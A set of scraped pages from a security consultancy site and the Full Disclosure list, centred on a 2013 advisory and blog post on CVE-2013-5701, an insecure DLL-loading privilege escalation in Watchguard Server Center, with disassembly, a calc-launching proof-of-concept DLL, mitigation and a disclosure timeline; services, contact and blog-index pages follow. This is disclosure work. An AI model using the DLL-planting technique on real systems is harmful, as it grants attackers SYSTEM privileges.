=== Content from www.rcesecurity.com_88bd2d73_20250125_164313.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

# CVE-2013-5701: Watchguard Server Center v11.7.4 wgpr.dll Local Privileges Escalation Vulnerability

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Sunday, September 8, 2013 | [Advisory](https://www.rcesecurity.com/category/advisory/), [Exploit](https://www.rcesecurity.com/category/exploit/) | [0 comments](https://www.rcesecurity.com/2013/09/cve-2013-5701-watchguard-server-center-v11-7-4-wgpr-dll-local-privileges-escalation-vulnerability/#respond)

Hello readers,

this is my first article in a series about vulnerabilities in [Watchguard](http://www.watchguard.com) products. Watchguard is a self-proclaimed NextGen Security vendor building security appliances for complete network protection. As I am working with Watchguard products for around 2 years now, I have to say that their firewall products are useable ‚Äì especially if you‚Äôre looking for a fast-to-implement and low-priced network security solution, but if you‚Äôre looking for more, I would rather implement a comprehensive Juniper solution.

The vulnerability [‚ÄúWatchguard Server Center v11.7.4 wgpr.dll Insecure Library Loading Local Privilege Escalation Vulnerability‚Äù](http://seclists.org/fulldisclosure/2013/Sep/43) is filed under CVE-2013-5701 and is a potential **0-Day threat** to all customers who are using the Watchguard Server Center.

The CVE describes a classic privileges escalation vulnerability due to an insecure library loading issue in two different modules of the Server Center:

* Watchguard Log Collector
* Watchguard WebBlocker Server

### What‚Äôs the problem ?

Both application services use a fixed path to look for specific files or libraries. This path includes directories that may not be trusted or under user control. By placing a custom version of a library in the application path, the program will load it before the legitimate version. This allows an attacker to inject custom code that will be run with the privileges of the program or user executing the program.

Since both services are running using the SYSTEM account, this may allow a less privileged user to gain access to SYSTEM privileges. A local attacker or compromised process is able to put a malicious application library into the directory which will be executed after a service restart.

### What happens if an attacker is able to exploit this vulnerability?

This basically means running calc.exe as SYSTEM üòâ :

[![CVE-2013-5701-4](/wp-content/uploads/2022/10/CVE-2013-5701-4.png)](/wp-content/uploads/2022/10/CVE-2013-5701-4.png)
### How can the vulnerability be exploited ?

The wlcollector.exe (same for the wbserver.exe) tries to load the file ‚Äúwgpr.dll‚Äù from the application directory where both files can usually be found. The real wgpr.dll is located directly in the ‚Äúwsm11‚Äù directory. This means the application stops searching for the original if it finds a same-looking in the application ‚Äúbin‚Äù directory.

[![CVE-2013-5701-2](/wp-content/uploads/2022/10/CVE-2013-5701-2.png)](/wp-content/uploads/2022/10/CVE-2013-5701-2.png)

To make the exploit library look like the real library, it‚Äôs important to spoof the entry ‚Äì point or at least one export. So when following the application flow, the string ‚Äúwgpr\_library\_get‚Äù is PUSH‚Äôed onto the stack and then used in a kernel32.GetProcAddress call. That‚Äôs it.

[![CVE-2013-5701-3](/wp-content/uploads/2022/10/CVE-2013-5701-3.png)](/wp-content/uploads/2022/10/CVE-2013-5701-3.png)

Now that we know the name of at least one function from the wgpr.dll, we are able to create our own arbitrary library:

```
#include

#define DLL_EXPORT __declspec(dllexport)

#ifdef __cplusplus
extern "C"
{
#endif

void DLL_EXPORT wgpr_library_get()
{
    WinExec("calc",0);
}

#ifdef __cplusplus
}
#endif

```

This code snippet simply creates the ‚Äúwgpr\_library\_get‚Äù export and its only task is to launch calc.exe ‚Äì as SYSTEM :-). Copying this library to the bin directory allows executing of everything you may imagine ‚Äì and can be semi-automated using Metasploit.

### Any limitations and/or mitigations?

Not all installations of the Server Center are vulnerable ‚Äì this highly depends on the directory where the administrator installed the software:

* On a default installation (%programfiles%\Watchguard) of the Watchguard Server¬†Center on Windows Vista and above the directory permissions disallow an¬†low-privileged attacker to mount the attack.
* On a default installation (%programfiles%\Watchguard) of the Watchguard Server¬†Center on Windows XP, the attacker needs to have at least Power User rights to¬†successfully mount the attack.
* On a non-default installation of the Watchguard Server Center to a directory,¬†which is writeable by a low-privileged user, the attack can be mounted successfully¬†without any restrictions

The logical conclusion: To make sure this vulnerability isn‚Äôt used in a privileges escalation scenario, you only need to harden the directory permissions to make it impossible for low-privileged users to write own files into the bin/ directory.

### Some last words (criticism) about the disclosure ‚Äì process.

The disclosure process started like with every other advisory, I‚Äôve coordinated: You‚Äôre looking for some way of contacting the vendor. But what if the vendor does not provide a useful address ? Contacting using some info@ or POST-forms is most of the time useless, because they are (but ony if they are) read by the wrong people.

Watchguard in this case did not provide a dedicated address to report security vulnerabilities. No support@, no security@ addresses were available, which results in missing RFC2142, although they assure that they are closely working with 3rd party security researchers.

Fine, but how did those ‚Äúsecurity researchers‚Äù report their issues ? Well ‚Äì thanks to myself ‚Äì they have a security mail address including a gpg key from now on üôÇ

Finally‚Ä¶now just think about the fact that we‚Äôre talking about a security vendor here.

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from www.rcesecurity.com_e3f9f927_20250126_102131.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

# Services

We‚Äôre currently offering the following consulting services:

## Penetration Tests

A penetration test, or pen test, is a security assessment that involves simulating attacks on a computer system, network, or application. We attempt to identify vulnerabilities and weaknesses in the target system by using the same techniques and tools as potential malicious actors. The objective is to uncover and address security risks before they can be exploited, helping organizations enhance their cybersecurity defenses and protect against real threats. Penetration tests are a proactive measure to ensure the robustness of digital assets and data security.

We perform penetration tests against all kinds of targets:

* Web applications with any tech stack
* Web service APIs ‚Äì i.e., GraphQl, Rest, SOAP
* Android mobile apps
* iOS mobile apps

## Bug Bounty Services

Empower your organization‚Äôs cybersecurity with a tailored Bug Bounty Program. Take control of your digital defense by engaging a community of ethical hackers to proactively identify vulnerabilities. Running your own Bug Bounty Program enhances your security posture and demonstrates a commitment to staying ahead in the ever-evolving landscape of cyber threats.

Do you want to run your own vulnerability disclosure or bug bounty program? Or do you already operate one but are not happy with how it is managed? Do you want to have independent triage?

What we do:

* Setting up vulnerability disclosure and bug bounty programs
* Managing new and existing programs
* Triaging incoming bug bounty reports

## Source Code Reviews

A security source code review, also known as a code audit or static code analysis, is a meticulous examination of the software‚Äôs source code to identify and rectify security vulnerabilities and flaws. This in-depth analysis is crucial for ensuring that software applications are robust and resistant to potential cyber threats, as it enables developers and security experts to spot and mitigate security issues before they can be exploited by malicious actors.

We perform source code reviews of applications based on the following languages:

* Java
* PHP
* .NET

## Attack Surface Management

Attack Surface Management is a security practice focused on identifying, monitoring, and reducing digital vulnerabilities and potential points of attack within an organization‚Äôs IT environment. It involves a comprehensive assessment of the organization‚Äôs assets, including applications, networks, and data, to determine where and how malicious actors might exploit weaknesses. By actively managing and minimizing the attack surface, organizations can strengthen their security posture, reduce risks, and safeguard their systems and data from potential cyber threats.

What we do:

* Continuous monitoring of any of your assets, including mobile apps.

## Interested in getting hacked?

Leave me a message at¬†**info [a.t] rcesecurity [d.o.t] com** or use the [contact form](https://www.rcesecurity.com/contact/).

## Past Customers and Projects

* `Big international airline`¬†‚Äì Performed penetration test against internet-facing assets
* `Big German DSL/cable modem manufacturer`¬†‚Äì Performed penetration test against hardware devices
* `Big German domain registrar`¬†‚Äì Performed penetration test against newly developed web api
* `Big German insurance company`¬†‚Äì White-box security configuration review
* `Big German transportation company`¬†‚Äì Performed penetration tests against new web functionality
* `Mid-sized German ridesharing company`¬†‚Äì Performed penetration test against all web assets
* `Mid-sized German cargo company`¬†‚Äì Performed firewall configuration analysis and maintenance
* `Mid-sized German animal food wholesaler`¬†‚Äì Secured email infrastructure via configuration review
* `Mid-sized German banking tool vendor`¬†‚Äì Performed penetration test against Windows thick client
* `Mid-sized German bank`¬†‚Äì Performed penetration test against customer-facing web application and API
* `Small-sized German dog food shop`¬†‚Äì Performed security hardening of an online shop

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from www.rcesecurity.com_92b39d50_20250126_102130.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

# Contact Us

We‚Äôre happy to answer all your questions, either via info[at]rcesecurity[.]com ([PGP preferred](https://keys.openpgp.org/vks/v1/by-fingerprint/595CA6DE70B5FA2A325F5F93CE3BF0ACD107D49B)) or via the following contact form:

Please enable JavaScript in your browser to complete this form.Your Name: \*Your email: \*Your message: \*Submit![Loading](https://www.rcesecurity.com/wp-content/plugins/wpforms-lite/assets/images/submit-spin.svg)

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from seclists.org_54f0cde0_20250125_164312.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](42)
[By Date](date.html#43)
[![Next](/images/right-icon-16x16.png)](44)

[![Previous](/images/left-icon-16x16.png)](42)
[By Thread](index.html#43)
[![Next](/images/right-icon-16x16.png)](44)

![](/shared/images/nst-icons.svg#search)

# [CVE-2013-5701] Watchguard Server Center v11.7.4 wgpr.dll Insecure Library Loading Local Privilege Escalation Vulnerability

---

*From*: Julien Ahrens <info () rcesecurity com>

*Date*: Sun, 08 Sep 2013 21:42:21 +0200

---

```
Watchguard Server Center v11.7.4 wgpr.dll Insecure Library Loading Local
Privilege Escalation Vulnerability

RCE Security Advisory
<http://www.rcesecurity.com>

1. ADVISORY INFORMATION
-----------------------
Product:        Watchguard Server Center
Vendor URL:     www.watchguard.com
Type:           Uncontrolled Search Path Element [CWE-427]
Date found:     2013-07-29
Date published: 2013-08-09
CVSSv2 Score:   6,6 (AV:L/AC:M/Au:S/C:C/I:C/A:C)
CVE:            CVE-2013-5701

2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.

3. VERSIONS AFFECTED
--------------------
Watchguard Server Center v11.7.4
Watchguard Server Center v11.7.3
and other older versions may be affected too.

4. VULNERABILITY DESCRIPTION
----------------------------
An insecure library loading vulnerability has been identified in different
components of the Watchguard Server Center v11.7.4.

The application installs two services "Watchguard Log Collector"
(%installdir%\wsm11\wlcollector\bin\wlcollector.exe)
and "Watchguard WebBlocker Server"
(%installdir%\wsm11\wbserver\bin\wbserver.exe).

Both application services use a fixed path to look for specific files or
libraries. This path includes directories that may not be trusted or under
user control.

By placing a custom version of a library in the application path, the
program will load it before the legitimate version. This allows an attacker
to inject custom code that will be run with the privilege of the program or
user executing the program. The following libraries could be hijacked on
this way:

wgpr.dll

Since both services are running using the SYSTEM account, this may allow a
less privileged user to gain access to SYSTEM privileges. A local attacker
or compromised process is able to put a malicious application library into
the directory which will be executed after a service restart.

On a default installation (%programfiles%\Watchguard) of the Watchguard
Server Center on Windows Vista and above the directory permissions disallow
an low-privileged attacker to mount the attack.

On a default installation (%programfiles%\Watchguard) of the Watchguard
Server Center on Windows XP, the attacker needs to have at least Power User
rights to successfully mount the attack.

On a non-default installation of the Watchguard Server Center to a
directory, which is writeable by a low-privileged user, the attack can be
mounted successfully without any restrictions.

5. DEBUG INFORMATION
--------------------
The vulnerable code part of wlcollector.exe:

00401691  MOV EDI,DWORD PTR DS:[<&KERNEL32.LoadLib>;  kernel32.LoadLibraryA
00401697  MOV ESI,EAX
00401699  TEST ESI,ESI
0040169B  JE SHORT wlcollec.004016B3
0040169D  PUSH wlcollec.00409320              ; /ProcNameOrOrdinal
004016A2  PUSH wlcollec.00409310              ; |/FileName = "kernel32.dll"
004016A7  CALL EDI                            ; |\LoadLibraryA
004016A9  PUSH EAX                            ; |hModule
004016AA  CALL EBX                            ; \GetProcAddress
004016AC  TEST EAX,EAX
004016AE  JE SHORT wlcollec.004016B3
004016B0  PUSH ESI
004016B1  CALL EAX
004016B3  PUSH wlcollec.00409304              ;  ASCII "wgpr.dll"
004016B8  CALL EDI                            ;  kernel32.LoadLibraryA

The vulnerable code part of wbserver.exe

00401041  MOV EDI,DWORD PTR DS:[<&KERNEL32.LoadLib>;  kernel32.LoadLibraryA
00401047  MOV ESI,EAX
00401049  TEST ESI,ESI
0040104B  JE SHORT wbserver.00401063
0040104D  PUSH wbserver.00408284              ; /ProcNameOrOrdinal
00401052  PUSH wbserver.00408274              ; |/FileName = "kernel32.dll"
00401057  CALL EDI                            ; |\LoadLibraryA
00401059  PUSH EAX                            ; |hModule
0040105A  CALL EBX                            ; \GetProcAddress
0040105C  TEST EAX,EAX
0040105E  JE SHORT wbserver.00401063
00401060  PUSH ESI
00401061  CALL EAX
00401063  PUSH wbserver.00408268              ;  ASCII "wgpr.dll"
00401068  CALL EDI

6. PROOF-OF-CONCEPT (CODE / EXPLOIT)
------------------------------------
Use the following code to exploit the vulnerability:

#include <windows.h>

#define DLL_EXPORT __declspec(dllexport)

#ifdef __cplusplus
extern "C"
{
#endif

void DLL_EXPORT wgpr_library_get()
{
    WinExec("calc",0);
}

#ifdef __cplusplus
}
#endif

6. SOLUTION
-----------
Administrators who installed the Watchguard Server Center on WinXP or
outside the default installation folder, should harden the directories
permissions (administrative write permissions only) on the mentioned
folders to lower the attack risk.

7. REPORT TIMELINE
------------------
2013-07-29: Discovery of the vulnerability
2013-07-30: RCE Security sends first notification to Customer Care via mail
            with disclosure date set to 13. August 2013
2013-08-05: RCE Security sends second notification using Twitter
2013-08-05: Response from vendor
2013-08-05: RCE Security sends vulnerability details to vendor
2013-08-05: Vendor ACKs the issue and asks for an extension of 30 days
2013-08-06: New disclosure date set to 13. September 2013
2013-08-06: Vendor assigns bug id #75251
2013-08-19: No further status updates received according to disclosure
            policy, asking for status update
2013-08-19: Vendor estimates the risk of the issue as "extremely limited",
            and therefor ACKs the public disclosure
2013-08-28: Vendor plans to release the fix with the next major release in
            around Q4
2013-09-05: MITRE assigns CVE-2013-5701 for this issue
2013-09-08: Full Disclosure

8. REFERENCES
-------------
<https://www.rcesecurity.com/2013/09/cve-2013-5701-watchguard-server-center-v11-7-4-wgpr-dll-local-privileges-escalation-vulnerability/>

_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>

```

---

[![Previous](/images/left-icon-16x16.png)](42)
[By Date](date.html#43)
[![Next](/images/right-icon-16x16.png)](44)

[![Previous](/images/left-icon-16x16.png)](42)
[By Thread](index.html#43)
[![Next](/images/right-icon-16x16.png)](44)

### Current thread:

* **[CVE-2013-5701] Watchguard Server Center v11.7.4 wgpr.dll Insecure Library Loading Local Privilege Escalation Vulnerability** *Julien Ahrens (Sep 08)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.rcesecurity.com_b0be937b_20250126_102130.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

[![WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/wp-content/uploads/2024/08/cve-2024-5932-0.png)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)
## [WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, August 26, 2024 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

A few days ago, Wordfence published a blog post about a PHP Object Injection vulnerability affecting the popular WordPress Plugin GiveWP in all versions <= 3.14.1. Since the blog post contains only information about (a part) of the POP chain used, I decided to take a look and build a fully functional Remote Code Execution exploit. This post describes how I approached the process, identifying the missing parts and building the entire POP chain.

[![Patch Diffing CVE-2023-28121 to Compromise a WooCommerce](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-4.png)](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/)
## [Patch Diffing CVE-2023-28121 to Compromise a WooCommerce](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, July 3, 2023 | [Exploit](https://www.rcesecurity.com/category/exploit/), [Patch Diffing](https://www.rcesecurity.com/category/patch-diffing/)

Back in March 2023, I noticed an interesting security advisory that was published by Wordfence about a critical ‚ÄúAuthentication Bypass and Privilege Escalation‚Äù (aka CVE-2023-28121) affecting the ‚ÄúWooCommerce Payments‚Äù plugin which has more...

[![SecurePwn Part 2: Leaking Remote Memory Contents (CVE-2023-22897)](https://www.rcesecurity.com/wp-content/uploads/2023/04/securepwn-10.png)](https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/)
## [SecurePwn Part 2: Leaking Remote Memory Contents (CVE-2023-22897)](https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Wednesday, April 12, 2023 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

While my last finding affecting SecurePoint‚Äôs UTM was quite interesting already, I was hit by a really hard OpenSSL Heartbleed flashback with this one. The following exploit works against both the admin portal on port 11115 as well as the user portal on port...

[![SecurePwn Part 1: Bypassing SecurePoint UTM‚Äôs Authentication (CVE-2023-22620)](https://www.rcesecurity.com/wp-content/uploads/2023/01/securepwn-1.png)](https://www.rcesecurity.com/2023/04/securepwn-part-1-bypassing-securepoint-utms-authentication-cve-2023-22620/)
## [SecurePwn Part 1: Bypassing SecurePoint UTM‚Äôs Authentication (CVE-2023-22620)](https://www.rcesecurity.com/2023/04/securepwn-part-1-bypassing-securepoint-utms-authentication-cve-2023-22620/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Tuesday, April 11, 2023 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

While working on a recent customer engagement, I discovered two fascinating and somewhat weird bugs in SecurePoint‚Äôs UTM firewall solution. The first one, aka CVE-2023-22620, is rated critical for an attacker to bypass the entire authentication and gain access...

[![From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/wp-content/uploads/2022/12/dcm-sqli-9.png)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)
## [From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Thursday, December 1, 2022 | [Advisory](https://www.rcesecurity.com/category/advisory/), [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/)

[![From Zero to Hero Part 1: Bypassing Intel DCM‚Äôs Authentication by Spoofing Kerberos and LDAP Responses (CVE-2022-33942)](https://www.rcesecurity.com/wp-content/uploads/2022/11/dcm-auth-bypass-3.png)](https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/)
## [From Zero to Hero Part 1: Bypassing Intel DCM‚Äôs Authentication by Spoofing Kerberos and LDAP Responses (CVE-2022-33942)](https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Wednesday, November 23, 2022 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/)

This small series of two blog posts covers an entire vulnerability chain to go from unauthenticated user to full remote code execution against Intel‚Äôs Data Center Manager (up to version 4.1.1.45749).The chain‚Äôs first vulnerability bypasses DCM‚Äôs entire authentication process.

[![WordPress Transposh: Exploiting a Blind SQL Injection via XSS](https://www.rcesecurity.com/wp-content/uploads/2022/10/transposh-chain-6.png)](https://www.rcesecurity.com/2022/07/wordpress-transposh-exploiting-a-blind-sql-injection-via-xss/)
## [WordPress Transposh: Exploiting a Blind SQL Injection via XSS](https://www.rcesecurity.com/2022/07/wordpress-transposh-exploiting-a-blind-sql-injection-via-xss/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Friday, July 22, 2022 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/)

Introduction You probably have read about my recent swamp of CVEs affecting a WordPress plugin called Transposh Translation Filter, which resulted in more than $30,000 in bounties: [CVE-2021-24910] Transposh <= 1.0.7 ‚Äútp\_tp‚Äù Unauthenticated Reflected Cross-Site...

[![AWAE Course and OSWE Exam Review](https://www.rcesecurity.com/wp-content/uploads/2022/10/oswe.png)](https://www.rcesecurity.com/2022/04/awae-course-and-oswe-exam-review/)
## [AWAE Course and OSWE Exam Review](https://www.rcesecurity.com/2022/04/awae-course-and-oswe-exam-review/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Friday, April 22, 2022 | [Certifications](https://www.rcesecurity.com/category/certifications/)

Introduction This is a review of the Advanced Web Attacks and Exploitation (WEB-300) course and its OSWE exam by Offensive-Security. I‚Äôve taken this course because I was curious about what secret tricks this course will offer for its money, especially...

[![Smuggling an (Un)exploitable XSS](https://www.rcesecurity.com/wp-content/uploads/2022/10/smug-202010-1.png)](https://www.rcesecurity.com/2020/11/smuggling-an-un-exploitable-xss/)
## [Smuggling an (Un)exploitable XSS](https://www.rcesecurity.com/2020/11/smuggling-an-un-exploitable-xss/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Friday, November 13, 2020 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/)

This is the story about how I‚Äôve chained a seemingly uninteresting request smuggling vulnerability with an even more uninteresting header-based XSS to redirect network-internal web site users without any user interaction to arbitrary pages. This post also...

[![CVE-2020-16171: Exploiting Acronis Cyber Backup for Fun and Emails](https://www.rcesecurity.com/wp-content/uploads/2022/10/CVE-2020-16171-1.png)](https://www.rcesecurity.com/2020/09/cve-2020-16171-exploiting-acronis-cyber-backup-for-fun-and-emails/)
## [CVE-2020-16171: Exploiting Acronis Cyber Backup for Fun and Emails](https://www.rcesecurity.com/2020/09/cve-2020-16171-exploiting-acronis-cyber-backup-for-fun-and-emails/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, September 14, 2020 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/)

You have probably read one or more blog posts about SSRFs, many being escalated to RCE. While this might be the ultimate goal, this post is about an often overlooked impact of SSRFs: application logic impact. This post will tell you the story about an unauthenticated...

[¬´ Older Entries](https://www.rcesecurity.com/blog/page/2/)

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from www.rcesecurity.com_84c1e487_20250126_102131.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

# CVE-2013-5701: Watchguard Server Center v11.7.4 wgpr.dll Local Privileges Escalation Vulnerability

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Sunday, September 8, 2013 | [Advisory](https://www.rcesecurity.com/category/advisory/), [Exploit](https://www.rcesecurity.com/category/exploit/) | [0 comments](https://www.rcesecurity.com/2013/09/cve-2013-5701-watchguard-server-center-v11-7-4-wgpr-dll-local-privileges-escalation-vulnerability/#respond)

Hello readers,

this is my first article in a series about vulnerabilities in [Watchguard](http://www.watchguard.com) products. Watchguard is a self-proclaimed NextGen Security vendor building security appliances for complete network protection. As I am working with Watchguard products for around 2 years now, I have to say that their firewall products are useable ‚Äì especially if you‚Äôre looking for a fast-to-implement and low-priced network security solution, but if you‚Äôre looking for more, I would rather implement a comprehensive Juniper solution.

The vulnerability [‚ÄúWatchguard Server Center v11.7.4 wgpr.dll Insecure Library Loading Local Privilege Escalation Vulnerability‚Äù](http://seclists.org/fulldisclosure/2013/Sep/43) is filed under CVE-2013-5701 and is a potential **0-Day threat** to all customers who are using the Watchguard Server Center.

The CVE describes a classic privileges escalation vulnerability due to an insecure library loading issue in two different modules of the Server Center:

* Watchguard Log Collector
* Watchguard WebBlocker Server

### What‚Äôs the problem ?

Both application services use a fixed path to look for specific files or libraries. This path includes directories that may not be trusted or under user control. By placing a custom version of a library in the application path, the program will load it before the legitimate version. This allows an attacker to inject custom code that will be run with the privileges of the program or user executing the program.

Since both services are running using the SYSTEM account, this may allow a less privileged user to gain access to SYSTEM privileges. A local attacker or compromised process is able to put a malicious application library into the directory which will be executed after a service restart.

### What happens if an attacker is able to exploit this vulnerability?

This basically means running calc.exe as SYSTEM üòâ :

[![CVE-2013-5701-4](/wp-content/uploads/2022/10/CVE-2013-5701-4.png)](/wp-content/uploads/2022/10/CVE-2013-5701-4.png)
### How can the vulnerability be exploited ?

The wlcollector.exe (same for the wbserver.exe) tries to load the file ‚Äúwgpr.dll‚Äù from the application directory where both files can usually be found. The real wgpr.dll is located directly in the ‚Äúwsm11‚Äù directory. This means the application stops searching for the original if it finds a same-looking in the application ‚Äúbin‚Äù directory.

[![CVE-2013-5701-2](/wp-content/uploads/2022/10/CVE-2013-5701-2.png)](/wp-content/uploads/2022/10/CVE-2013-5701-2.png)

To make the exploit library look like the real library, it‚Äôs important to spoof the entry ‚Äì point or at least one export. So when following the application flow, the string ‚Äúwgpr\_library\_get‚Äù is PUSH‚Äôed onto the stack and then used in a kernel32.GetProcAddress call. That‚Äôs it.

